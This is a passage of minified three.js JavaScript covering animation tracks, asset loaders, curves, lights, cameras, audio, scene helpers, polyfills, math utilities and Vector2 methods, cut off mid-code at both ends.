0===t)throw Error("THREE.KeyframeTrack: track name is undefined");if(void 0===e||0===e.length)throw Error("THREE.KeyframeTrack: no keyframes in track named "+t);this.name=t,this.times=pl.convertArray(e,this.TimeBufferType),this.values=pl.convertArray(i,this.ValueBufferType),this.setInterpolation(n||this.DefaultInterpolation)}function En(t,e,i){Tn.call(this,t,e,i)}function Cn(t,e,i,n){Tn.call(this,t,e,i,n)}function An(t,e,i,n){Tn.call(this,t,e,i,n)}function Ln(t,e,i,n){wn.call(this,t,e,i,n)}function Pn(t,e,i,n){Tn.call(this,t,e,i,n)}function Rn(t,e,i,n){Tn.call(this,t,e,i,n)}function On(t,e,i,n){Tn.call(this,t,e,i,n)}function In(t,e,i){this.name=t,this.tracks=i,this.duration=void 0!==e?e:-1,this.uuid=Ca.generateUUID(),0>this.duration&&this.resetDuration()}function zn(t){if(void 0===t.type)throw Error("THREE.KeyframeTrack: track type undefined, can not parse");var e=function(t){switch(t.toLowerCase()){case"scalar":case"double":case"float":case"number":case"integer":return An;case"vector":case"vector2":case"vector3":case"vector4":return On;case"color":return Cn;case"quaternion":return Pn;case"bool":case"boolean":return En;case"string":return Rn}throw Error("THREE.KeyframeTrack: Unsupported typeName: "+t)}(t.type);if(void 0===t.times){var i=[],n=[];pl.flattenJSON(t.keys,i,n,"value"),t.times=i,t.values=n}return void 0!==e.parse?e.parse(t):new e(t.name,t.times,t.values,t.interpolation)}function Dn(t,e,i){var n=this,r=!1,a=0,o=0,s=void 0;this.onStart=void 0,this.onLoad=t,this.onProgress=e,this.onError=i,this.itemStart=function(t){o++,!1===r&&void 0!==n.onStart&&n.onStart(t,a,o),r=!0},this.itemEnd=function(t){a++,void 0!==n.onProgress&&n.onProgress(t,a,o),a===o&&(r=!1,void 0!==n.onLoad)&&n.onLoad()},this.itemError=function(t){void 0!==n.onError&&n.onError(t)},this.resolveURL=function(t){return s?s(t):t},this.setURLModifier=function(t){return s=t,this}}function Nn(t){this.manager=void 0!==t?t:ml,this.crossOrigin="anonymous",this.resourcePath=this.path=""}function kn(t){Nn.call(this,t)}function Bn(t){Nn.call(this,t)}function Fn(t){Nn.call(this,t),this._parser=null}function Hn(t){Nn.call(this,t),this._parser=null}function Gn(t){Nn.call(this,t)}function jn(t){Nn.call(this,t)}function Un(t){Nn.call(this,t)}function Vn(){this.type="Curve",this.arcLengthDivisions=200}function Wn(t,e,i,n,r,a,o,s){Vn.call(this),this.type="EllipseCurve",this.aX=t||0,this.aY=e||0,this.xRadius=i||1,this.yRadius=n||1,this.aStartAngle=r||0,this.aEndAngle=a||2*Math.PI,this.aClockwise=o||!1,this.aRotation=s||0}function qn(t,e,i,n,r,a){Wn.call(this,t,e,i,i,n,r,a),this.type="ArcCurve"}function Xn(){var t=0,e=0,i=0,n=0;return{initCatmullRom:function(r,a,o,s,l){t=a,e=r=l*(o-r),i=-3*a+3*o-2*r-(s=l*(s-a)),n=2*a-2*o+r+s},initNonuniformCatmullRom:function(r,a,o,s,l,c,h){t=a,e=r=((a-r)/l-(o-r)/(l+c)+(o-a)/c)*c,i=-3*a+3*o-2*r-(s=((o-a)/c-(s-a)/(c+h)+(s-o)/h)*c),n=2*a-2*o+r+s},calc:function(r){var a=r*r;return t+e*r+i*a+n*a*r}}}function Yn(t,e,i,n){Vn.call(this),this.type="CatmullRomCurve3",this.points=t||[],this.closed=e||!1,this.curveType=i||"centripetal",this.tension=n||.5}function $n(t,e,i,n,r){var a=t*t;return(2*i-2*n+(e=.5*(n-e))+(r=.5*(r-i)))*t*a+(-3*i+3*n-2*e-r)*a+e*t+i}function Zn(t,e,i,n){var r=1-t;return r*r*e+2*(1-t)*t*i+t*t*n}function Jn(t,e,i,n,r){var a=1-t,o=1-t;return a*a*a*e+3*o*o*t*i+3*(1-t)*t*t*n+t*t*t*r}function Kn(t,e,n,r){Vn.call(this),this.type="CubicBezierCurve",this.v0=t||new i,this.v1=e||new i,this.v2=n||new i,this.v3=r||new i}function Qn(t,e,i,n){Vn.call(this),this.type="CubicBezierCurve3",this.v0=t||new r,this.v1=e||new r,this.v2=i||new r,this.v3=n||new r}function tr(t,e){Vn.call(this),this.type="LineCurve",this.v1=t||new i,this.v2=e||new i}function er(t,e){Vn.call(this),this.type="LineCurve3",this.v1=t||new r,this.v2=e||new r}function ir(t,e,n){Vn.call(this),this.type="QuadraticBezierCurve",this.v0=t||new i,this.v1=e||new i,this.v2=n||new i}function nr(t,e,i){Vn.call(this),this.type="QuadraticBezierCurve3",this.v0=t||new r,this.v1=e||new r,this.v2=i||new r}function rr(t){Vn.call(this),this.type="SplineCurve",this.points=t||[]}function ar(){Vn.call(this),this.type="CurvePath",this.curves=[],this.autoClose=!1}function or(t){ar.call(this),this.type="Path",this.currentPoint=new i,t&&this.setFromPoints(t)}function sr(t){or.call(this,t),this.uuid=Ca.generateUUID(),this.type="Shape",this.holes=[]}function lr(t,e){p.call(this),this.type="Light",this.color=new b(t),this.intensity=void 0!==e?e:1,this.receiveShadow=void 0}function cr(t,e,i){lr.call(this,t,i),this.type="HemisphereLight",this.castShadow=void 0,this.position.copy(p.DefaultUp),this.updateMatrix(),this.groundColor=new b(e)}function hr(t){this.camera=t,this.bias=0,this.radius=1,this.mapSize=new i(512,512),this.mapPass=this.map=null,this.matrix=new h,this._frustum=new et,this._frameExtents=new i(1,1),this._viewportCount=1,this._viewports=[new s(0,0,1,1)]}function ur(){hr.call(this,new Z(50,1,.5,500))}function dr(t,e,i,n,r,a){lr.call(this,t,e),this.type="SpotLight",this.position.copy(p.DefaultUp),this.updateMatrix(),this.target=new p,Object.defineProperty(this,"power",{get:function(){return this.intensity*Math.PI},set:function(t){this.intensity=t/Math.PI}}),this.distance=void 0!==i?i:0,this.angle=void 0!==n?n:Math.PI/3,this.penumbra=void 0!==r?r:0,this.decay=void 0!==a?a:1,this.shadow=new ur}function pr(){hr.call(this,new Z(90,1,.5,500)),this._frameExtents=new i(4,2),this._viewportCount=6,this._viewports=[new s(2,1,1,1),new s(0,1,1,1),new s(3,1,1,1),new s(1,1,1,1),new s(3,0,1,1),new s(1,0,1,1)],this._cubeDirections=[new r(1,0,0),new r(-1,0,0),new r(0,0,1),new r(0,0,-1),new r(0,1,0),new r(0,-1,0)],this._cubeUps=[new r(0,1,0),new r(0,1,0),new r(0,1,0),new r(0,1,0),new r(0,0,1),new r(0,0,-1)]}function fr(t,e,i,n){lr.call(this,t,e),this.type="PointLight",Object.defineProperty(this,"power",{get:function(){return 4*this.intensity*Math.PI},set:function(t){this.intensity=t/(4*Math.PI)}}),this.distance=void 0!==i?i:0,this.decay=void 0!==n?n:1,this.shadow=new pr}function mr(t,e,i,n,r,a){$.call(this),this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=void 0!==t?t:-1,this.right=void 0!==e?e:1,this.top=void 0!==i?i:1,this.bottom=void 0!==n?n:-1,this.near=void 0!==r?r:.1,this.far=void 0!==a?a:2e3,this.updateProjectionMatrix()}function gr(){hr.call(this,new mr(-5,5,5,-5,.5,500))}function vr(t,e){lr.call(this,t,e),this.type="DirectionalLight",this.position.copy(p.DefaultUp),this.updateMatrix(),this.target=new p,this.shadow=new gr}function yr(t,e){lr.call(this,t,e),this.type="AmbientLight",this.castShadow=void 0}function xr(t,e,i,n){lr.call(this,t,e),this.type="RectAreaLight",this.width=void 0!==i?i:10,this.height=void 0!==n?n:10}function br(t){Nn.call(this,t),this.textures={}}function wr(){F.call(this),this.type="InstancedBufferGeometry",this.maxInstancedCount=void 0}function _r(t,e,i,n){"number"==typeof i&&(n=i,i=!1,console.error("THREE.InstancedBufferAttribute: The constructor now expects normalized as the third argument.")),C.call(this,t,e,i),this.meshPerAttribute=n||1}function Mr(t){Nn.call(this,t)}function Sr(t){Nn.call(this,t)}function Tr(t){"undefined"==typeof createImageBitmap&&console.warn("THREE.ImageBitmapLoader: createImageBitmap() not supported."),"undefined"==typeof fetch&&console.warn("THREE.ImageBitmapLoader: fetch() not supported."),Nn.call(this,t),this.options=void 0}function Er(){this.type="ShapePath",this.color=new b,this.subPaths=[],this.currentPath=null}function Cr(t){this.type="Font",this.data=t}function Ar(t){Nn.call(this,t)}function Lr(t){Nn.call(this,t)}function Pr(){this.coefficients=[];for(var t=0;9>t;t++)this.coefficients.push(new r)}function Rr(t,e){lr.call(this,void 0,e),this.sh=void 0!==t?t:new Pr}function Or(t,e,i){Rr.call(this,void 0,i),t=(new b).set(t),i=(new b).set(e),e=new r(t.r,t.g,t.b),t=new r(i.r,i.g,i.b);var n=(i=Math.sqrt(Math.PI))*Math.sqrt(.75);this.sh.coefficients[0].copy(e).add(t).multiplyScalar(i),this.sh.coefficients[1].copy(e).sub(t).multiplyScalar(n)}function Ir(t,e){Rr.call(this,void 0,e),t=(new b).set(t),this.sh.coefficients[0].set(t.r,t.g,t.b).multiplyScalar(2*Math.sqrt(Math.PI))}function zr(){this.type="StereoCamera",this.aspect=1,this.eyeSep=.064,this.cameraL=new Z,this.cameraL.layers.enable(1),this.cameraL.matrixAutoUpdate=!1,this.cameraR=new Z,this.cameraR.layers.enable(2),this.cameraR.matrixAutoUpdate=!1,this._cache={focus:null,fov:null,aspect:null,near:null,far:null,zoom:null,eyeSep:null}}function Dr(t){this.autoStart=void 0===t||t,this.elapsedTime=this.oldTime=this.startTime=0,this.running=!1}function Nr(){p.call(this),this.type="AudioListener",this.context=Al.getContext(),this.gain=this.context.createGain(),this.gain.connect(this.context.destination),this.filter=null,this.timeDelta=0,this._clock=new Dr}function kr(t){p.call(this),this.type="Audio",this.listener=t,this.context=t.context,this.gain=this.context.createGain(),this.gain.connect(t.getInput()),this.autoplay=!1,this.buffer=null,this.detune=0,this.loop=!1,this.offset=this.startTime=0,this.duration=void 0,this.playbackRate=1,this.isPlaying=!1,this.hasPlaybackControl=!0,this.sourceType="empty",this.filters=[]}function Br(t){kr.call(this,t),this.panner=this.context.createPanner(),this.panner.panningModel="HRTF",this.panner.connect(this.gain)}function Fr(t,e){this.analyser=t.context.createAnalyser(),this.analyser.fftSize=void 0!==e?e:2048,this.data=new Uint8Array(this.analyser.frequencyBinCount),t.getOutput().connect(this.analyser)}function Hr(t,e,i){switch(this.binding=t,this.valueSize=i,t=Float64Array,e){case"quaternion":e=this._slerp;break;case"string":case"bool":t=Array,e=this._select;break;default:e=this._lerp}this.buffer=new t(4*i),this._mixBufferRegion=e,this.referenceCount=this.useCount=this.cumulativeWeight=0}function Gr(t,e,i){i=i||jr.parseTrackName(e),this._targetGroup=t,this._bindings=t.subscribe_(e,i)}function jr(t,e,i){this.path=e,this.parsedPath=i||jr.parseTrackName(e),this.node=jr.findNode(t,this.parsedPath.nodeName)||t,this.rootNode=t}function Ur(){this.uuid=Ca.generateUUID(),this._objects=Array.prototype.slice.call(arguments),this.nCachedObjects_=0;var t={};this._indicesByUUID=t;for(var e=0,i=arguments.length;e!==i;++e)t[arguments[e].uuid]=e;this._paths=[],this._parsedPaths=[],this._bindings=[],this._bindingsIndicesByPath={};var n=this;this.stats={objects:{get total(){return n._objects.length},get inUse(){return this.total-n.nCachedObjects_}},get bindingsPerObject(){return n._bindings.length}}}function Vr(t,e,i){this._mixer=t,this._clip=e,this._localRoot=i||null,e=(t=e.tracks).length,i=Array(e);for(var n={endingStart:2400,endingEnd:2400},r=0;r!==e;++r){var a=t[r].createInterpolant(null);i[r]=a,a.settings=n}this._interpolantSettings=n,this._interpolants=i,this._propertyBindings=Array(e),this._weightInterpolant=this._timeScaleInterpolant=this._byClipCacheIndex=this._cacheIndex=null,this.loop=2201,this._loopCount=-1,this._startTime=null,this.time=0,this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1,this.repetitions=1/0,this.paused=!1,this.enabled=!0,this.clampWhenFinished=!1,this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0}function Wr(t){this._root=t,this._initMemoryManager(),this.time=this._accuIndex=0,this.timeScale=1}function qr(t,e){"string"==typeof t&&(console.warn("THREE.Uniform: Type parameter is no longer needed."),t=e),this.value=t}function Xr(t,e,i){Fe.call(this,t,e),this.meshPerAttribute=i||1}function Yr(t,e,i,n){this.ray=new y(t,e),this.near=i||0,this.far=n||1/0,this.camera=null,this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}},Object.defineProperties(this.params,{PointCloud:{get:function(){return console.warn("THREE.Raycaster: params.PointCloud has been renamed to params.Points."),this.Points}}})}function $r(t,e){return t.distance-e.distance}function Zr(t,e,i,n){if(!1!==t.visible&&(t.raycast(e,i),!0===n)){n=0;for(var r=(t=t.children).length;n<r;n++)Zr(t[n],e,i,!0)}}function Jr(t,e,i){return this.radius=void 0!==t?t:1,this.phi=void 0!==e?e:0,this.theta=void 0!==i?i:0,this}function Kr(t,e,i){return this.radius=void 0!==t?t:1,this.theta=void 0!==e?e:0,this.y=void 0!==i?i:0,this}function Qr(t,e){this.min=void 0!==t?t:new i(1/0,1/0),this.max=void 0!==e?e:new i(-1/0,-1/0)}function ta(t,e){this.start=void 0!==t?t:new r,this.end=void 0!==e?e:new r}function ea(t){p.call(this),this.material=t,this.render=function(){}}function ia(t,e,i,n){this.object=t,this.size=void 0!==e?e:1,t=void 0!==i?i:16711680,n=void 0!==n?n:1,e=0,(i=this.object.geometry)&&i.isGeometry?e=3*i.faces.length:i&&i.isBufferGeometry&&(e=i.attributes.normal.count),i=new F,e=new D(6*e,3),i.addAttribute("position",e),Ze.call(this,i,new Ye({color:t,linewidth:n})),this.matrixAutoUpdate=!1,this.update()}function na(t,e){p.call(this),this.light=t,this.light.updateMatrixWorld(),this.matrix=t.matrixWorld,this.matrixAutoUpdate=!1,this.color=e,t=new F,e=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1];for(var i=0,n=1;32>i;i++,n++){var r=i/32*Math.PI*2,a=n/32*Math.PI*2;e.push(Math.cos(r),Math.sin(r),1,Math.cos(a),Math.sin(a),1)}t.addAttribute("position",new D(e,3)),e=new Ye({fog:!1}),this.cone=new Ze(t,e),this.add(this.cone),this.update()}function ra(t){var e=[];t&&t.isBone&&e.push(t);for(var i=0;i<t.children.length;i++)e.push.apply(e,ra(t.children[i]));return e}function aa(t){for(var e=ra(t),i=new F,n=[],r=[],a=new b(0,0,1),o=new b(0,1,0),s=0;s<e.length;s++){var l=e[s];l.parent&&l.parent.isBone&&(n.push(0,0,0),n.push(0,0,0),r.push(a.r,a.g,a.b),r.push(o.r,o.g,o.b))}i.addAttribute("position",new D(n,3)),i.addAttribute("color",new D(r,3)),n=new Ye({vertexColors:2,depthTest:!1,depthWrite:!1,transparent:!0}),Ze.call(this,i,n),this.root=t,this.bones=e,this.matrix=t.matrixWorld,this.matrixAutoUpdate=!1}function oa(t,e,i){this.light=t,this.light.updateMatrixWorld(),this.color=i,t=new $i(e,4,2),e=new E({wireframe:!0,fog:!1}),H.call(this,t,e),this.matrix=this.light.matrixWorld,this.matrixAutoUpdate=!1,this.update()}function sa(t,e){this.type="RectAreaLightHelper",this.light=t,this.color=e,(t=new F).addAttribute("position",new D([1,1,0,-1,1,0,-1,-1,0,1,-1,0,1,1,0],3)),t.computeBoundingSphere(),e=new Ye({fog:!1}),$e.call(this,t,e),(t=new F).addAttribute("position",new D([1,1,0,-1,1,0,-1,-1,0,1,1,0,-1,-1,0,1,-1,0],3)),t.computeBoundingSphere(),this.add(new H(t,new E({side:1,fog:!1}))),this.update()}function la(t,e,i){p.call(this),this.light=t,this.light.updateMatrixWorld(),this.matrix=t.matrixWorld,this.matrixAutoUpdate=!1,this.color=i,(t=new pi(e)).rotateY(.5*Math.PI),this.material=new E({wireframe:!0,fog:!1}),void 0===this.color&&(this.material.vertexColors=2),e=t.getAttribute("position"),e=new Float32Array(3*e.count),t.addAttribute("color",new C(e,3)),this.add(new H(t,this.material)),this.update()}function ca(t,e){this.lightProbe=t,this.size=e,t=new Y({defines:{GAMMA_OUTPUT:""},uniforms:{sh:{value:this.lightProbe.sh.coefficients},intensity:{value:this.lightProbe.intensity}},vertexShader:"varying vec3 vNormal;\nvoid main() {\n\tvNormal = normalize( normalMatrix * normal );\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",fragmentShader:"#define RECIPROCAL_PI 0.318309886\nvec3 inverseTransformDirection( in vec3 normal, in mat4 matrix ) {\n\t// matrix is assumed to be orthogonal\n\treturn normalize( ( vec4( normal, 0.0 ) * matrix ).xyz );\n}\nvec3 linearToOutput( in vec3 a ) {\n\t#ifdef GAMMA_OUTPUT\n\t\treturn pow( a, vec3( 1.0 / float( GAMMA_FACTOR ) ) );\n\t#else\n\t\treturn a;\n\t#endif\n}\n// source: https://graphics.stanford.edu/papers/envmap/envmap.pdf\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\t// normal is assumed to have unit length\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\t// band 0\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\t// band 1\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\t// band 2\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nuniform vec3 sh[ 9 ]; // sh coefficients\nuniform float intensity; // light probe intensity\nvarying vec3 vNormal;\nvoid main() {\n\tvec3 normal = normalize( vNormal );\n\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, sh );\n\tvec3 outgoingLight = RECIPROCAL_PI * irradiance * intensity;\n\toutgoingLight = linearToOutput( outgoingLight );\n\tgl_FragColor = vec4( outgoingLight, 1.0 );\n}"}),e=new $i(1,32,16),H.call(this,e,t),this.onBeforeRender()}function ha(t,e,i,n){t=t||10,e=e||10,i=new b(void 0!==i?i:4473924),n=new b(void 0!==n?n:8947848);var r=e/2,a=t/e,o=t/2;t=[];for(var s=[],l=0,c=0,h=-o;l<=e;l++,h+=a){t.push(-o,0,h,o,0,h),t.push(h,0,-o,h,0,o);var u=l===r?i:n;u.toArray(s,c),c+=3,u.toArray(s,c),c+=3,u.toArray(s,c),c+=3,u.toArray(s,c),c+=3}(e=new F).addAttribute("position",new D(t,3)),e.addAttribute("color",new D(s,3)),i=new Ye({vertexColors:2}),Ze.call(this,e,i)}function ua(t,e,i,n,r,a){t=t||10,e=e||16,i=i||8,n=n||64,r=new b(void 0!==r?r:4473924),a=new b(void 0!==a?a:8947848);var o,s=[],l=[];for(o=0;o<=e;o++){var c=o/e*2*Math.PI,h=Math.sin(c)*t;c=Math.cos(c)*t,s.push(0,0,0),s.push(h,0,c);var u=1&o?r:a;l.push(u.r,u.g,u.b),l.push(u.r,u.g,u.b)}for(o=0;o<=i;o++){u=1&o?r:a;var d=t-t/i*o;for(e=0;e<n;e++)c=e/n*2*Math.PI,h=Math.sin(c)*d,c=Math.cos(c)*d,s.push(h,0,c),l.push(u.r,u.g,u.b),c=(e+1)/n*2*Math.PI,h=Math.sin(c)*d,c=Math.cos(c)*d,s.push(h,0,c),l.push(u.r,u.g,u.b)}(t=new F).addAttribute("position",new D(s,3)),t.addAttribute("color",new D(l,3)),s=new Ye({vertexColors:2}),Ze.call(this,t,s)}function da(t,e,i,n){this.audio=t,this.range=e||1,this.divisionsInnerAngle=i||16,this.divisionsOuterAngle=n||2,t=new F,e=new Float32Array(3*(3*(this.divisionsInnerAngle+2*this.divisionsOuterAngle)+3)),t.addAttribute("position",new C(e,3)),e=new Ye({color:65280}),i=new Ye({color:16776960}),$e.call(this,t,[i,e]),this.update()}function pa(t,e,i,n){this.object=t,this.size=void 0!==e?e:1,t=void 0!==i?i:16776960,n=void 0!==n?n:1,e=0,(i=this.object.geometry)&&i.isGeometry?e=i.faces.length:console.warn("THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead."),i=new F,e=new D(6*e,3),i.addAttribute("position",e),Ze.call(this,i,new Ye({color:t,linewidth:n})),this.matrixAutoUpdate=!1,this.update()}function fa(t,e,i){p.call(this),this.light=t,this.light.updateMatrixWorld(),this.matrix=t.matrixWorld,this.matrixAutoUpdate=!1,this.color=i,void 0===e&&(e=1),(t=new F).addAttribute("position",new D([-e,e,0,e,e,0,e,-e,0,-e,-e,0,-e,e,0],3)),e=new Ye({fog:!1}),this.lightPlane=new $e(t,e),this.add(this.lightPlane),(t=new F).addAttribute("position",new D([0,0,0,0,0,1],3)),this.targetLine=new $e(t,e),this.add(this.targetLine),this.update()}function ma(t){function e(t,e,n){i(t,n),i(e,n)}function i(t,e){a.push(0,0,0),o.push(e.r,e.g,e.b),void 0===s[t]&&(s[t]=[]),s[t].push(a.length/3-1)}var n=new F,r=new Ye({color:16777215,vertexColors:1}),a=[],o=[],s={},l=new b(16755200),c=new b(16711680),h=new b(43775),u=new b(16777215),d=new b(3355443);e("n1","n2",l),e("n2","n4",l),e("n4","n3",l),e("n3","n1",l),e("f1","f2",l),e("f2","f4",l),e("f4","f3",l),e("f3","f1",l),e("n1","f1",l),e("n2","f2",l),e("n3","f3",l),e("n4","f4",l),e("p","n1",c),e("p","n2",c),e("p","n3",c),e("p","n4",c),e("u1","u2",h),e("u2","u3",h),e("u3","u1",h),e("c","t",u),e("p","c",d),e("cn1","cn2",d),e("cn3","cn4",d),e("cf1","cf2",d),e("cf3","cf4",d),n.addAttribute("position",new D(a,3)),n.addAttribute("color",new D(o,3)),Ze.call(this,n,r),this.camera=t,this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix(),this.matrix=t.matrixWorld,this.matrixAutoUpdate=!1,this.pointMap=s,this.update()}function ga(t,e,i,n,r,a,o){if(pc.set(r,a,o).unproject(n),void 0!==(t=e[t]))for(i=i.getAttribute("position"),e=0,n=t.length;e<n;e++)i.setXYZ(t[e],pc.x,pc.y,pc.z)}function va(t,e){this.object=t,void 0===e&&(e=16776960),t=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]);var i=new Float32Array(24),n=new F;n.setIndex(new C(t,1)),n.addAttribute("position",new C(i,3)),Ze.call(this,n,new Ye({color:e})),this.matrixAutoUpdate=!1,this.update()}function ya(t,e){this.type="Box3Helper",this.box=t,e=e||16776960,t=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]);var i=new F;i.setIndex(new C(t,1)),i.addAttribute("position",new D([1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,-1,-1,1,-1,-1,-1,-1,1,-1,-1],3)),Ze.call(this,i,new Ye({color:e})),this.geometry.computeBoundingSphere()}function xa(t,e,i){this.type="PlaneHelper",this.plane=t,this.size=void 0===e?1:e,t=void 0!==i?i:16776960,(e=new F).addAttribute("position",new D([1,-1,1,-1,1,1,-1,-1,1,1,1,1,-1,1,1,-1,-1,1,1,-1,1,1,1,1,0,0,1,0,0,0],3)),e.computeBoundingSphere(),$e.call(this,e,new Ye({color:t})),(e=new F).addAttribute("position",new D([1,1,1,-1,1,1,-1,-1,1,1,1,1,-1,-1,1,1,-1,1],3)),e.computeBoundingSphere(),this.add(new H(e,new E({color:t,opacity:.2,transparent:!0,depthWrite:!1})))}function ba(t,e,i,n,a,o){p.call(this),void 0===t&&(t=new r(0,0,1)),void 0===e&&(e=new r(0,0,0)),void 0===i&&(i=1),void 0===n&&(n=16776960),void 0===a&&(a=.2*i),void 0===o&&(o=.2*a),void 0===gc&&((gc=new F).addAttribute("position",new D([0,0,0,0,1,0],3)),(vc=new on(0,.5,1,5,1)).translate(0,-.5,0)),this.position.copy(e),this.line=new $e(gc,new Ye({color:n})),this.line.matrixAutoUpdate=!1,this.add(this.line),this.cone=new H(vc,new E({color:n})),this.cone.matrixAutoUpdate=!1,this.add(this.cone),this.setDirection(t),this.setLength(i,a,o)}function wa(t){var e=[0,0,0,t=t||1,0,0,0,0,0,0,t,0,0,0,0,0,0,t];(t=new F).addAttribute("position",new D(e,3)),t.addAttribute("color",new D([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3)),e=new Ye({vertexColors:2}),Ze.call(this,t,e)}function _a(t){console.warn("THREE.ClosedSplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead."),Yn.call(this,t),this.type="catmullrom",this.closed=!0}function Ma(t){console.warn("THREE.SplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead."),Yn.call(this,t),this.type="catmullrom"}function Sa(t){console.warn("THREE.Spline has been removed. Use THREE.CatmullRomCurve3 instead."),Yn.call(this,t),this.type="catmullrom"}void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52)),void 0===Number.isInteger&&(Number.isInteger=function(t){return"number"==typeof t&&isFinite(t)&&Math.floor(t)===t}),void 0===Math.sign&&(Math.sign=function(t){return 0>t?-1:0<t?1:+t}),!1=="name"in Function.prototype&&Object.defineProperty(Function.prototype,"name",{get:function(){return this.toString().match(/^\s*function\s*([^\(\s]*)/)[1]}}),void 0===Object.assign&&(Object.assign=function(t){if(null==t)throw new TypeError("Cannot convert undefined or null to object");for(var e=Object(t),i=1;i<arguments.length;i++){var n=arguments[i];if(null!=n)for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}),Object.assign(e.prototype,{addEventListener:function(t,e){void 0===this._listeners&&(this._listeners={});var i=this._listeners;void 0===i[t]&&(i[t]=[]),-1===i[t].indexOf(e)&&i[t].push(e)},hasEventListener:function(t,e){if(void 0===this._listeners)return!1;var i=this._listeners;return void 0!==i[t]&&-1!==i[t].indexOf(e)},removeEventListener:function(t,e){void 0!==this._listeners&&(void 0!==(t=this._listeners[t])&&(-1!==(e=t.indexOf(e))&&t.splice(e,1)))},dispatchEvent:function(t){if(void 0!==this._listeners){var e=this._listeners[t.type];if(void 0!==e){t.target=this;for(var i=0,n=(e=e.slice(0)).length;i<n;i++)e[i].call(this,t)}}}});for(var Ta=[],Ea=0;256>Ea;Ea++)Ta[Ea]=(16>Ea?"0":"")+Ea.toString(16);var Ca={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var t=4294967295*Math.random()|0,e=4294967295*Math.random()|0,i=4294967295*Math.random()|0,n=4294967295*Math.random()|0;return(Ta[255&t]+Ta[t>>8&255]+Ta[t>>16&255]+Ta[t>>24&255]+"-"+Ta[255&e]+Ta[e>>8&255]+"-"+Ta[e>>16&15|64]+Ta[e>>24&255]+"-"+Ta[63&i|128]+Ta[i>>8&255]+"-"+Ta[i>>16&255]+Ta[i>>24&255]+Ta[255&n]+Ta[n>>8&255]+Ta[n>>16&255]+Ta[n>>24&255]).toUpperCase()},clamp:function(t,e,i){return Math.max(e,Math.min(i,t))},euclideanModulo:function(t,e){return(t%e+e)%e},mapLinear:function(t,e,i,n,r){return n+(t-e)*(r-n)/(i-e)},lerp:function(t,e,i){return(1-i)*t+i*e},smoothstep:function(t,e,i){return t<=e?0:t>=i?1:(t=(t-e)/(i-e))*t*(3-2*t)},smootherstep:function(t,e,i){return t<=e?0:t>=i?1:(t=(t-e)/(i-e))*t*t*(t*(6*t-15)+10)},randInt:function(t,e){return t+Math.floor(Math.random()*(e-t+1))},randFloat:function(t,e){return t+Math.random()*(e-t)},randFloatSpread:function(t){return t*(.5-Math.random())},degToRad:function(t){return t*Ca.DEG2RAD},radToDeg:function(t){return t*Ca.RAD2DEG},isPowerOfTwo:function(t){return 0==(t&t-1)&&0!==t},ceilPowerOfTwo:function(t){return Math.pow(2,Math.ceil(Math.log(t)/Math.LN2))},floorPowerOfTwo:function(t){return Math.pow(2,Math.floor(Math.log(t)/Math.LN2))}};Object.defineProperties(i.prototype,{width:{get:function(){return this.x},set:function(t){this.x=t}},height:{get:function(){return this.y},set:function(t){this.y=t}}}),Object.assign(i.prototype,{isVector2:!0,set:function(t,e){return this.x=t,this.y=e,this},setScalar:function(t){return this.y=this.x=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;default:throw Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;default:throw Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(t){return this.x=t.x,this.y=t.y,this},add:function(t,e){return void 0!==e?(console.warn("THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(t,e)):(this.x+=t.x,this.y+=t.y,this)},addScalar:function(t){return this.x+=t,this.y+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this},sub:function(t,e){return void 0!==e?(console.warn("THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(t,e)):(this.x-=t.x,this.y-=t.y,this)},subScalar:function(t){return this.x-=t,this.y-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this},multiply:function(t){return this.x*=t.x,this.y*=t.y,this},multiplyScalar:function(t){return this.x*=t,this.y*=t,this},divide:function(t){return this.x/=t.x,this.y/=t.y,this},divideScalar:function(t){return 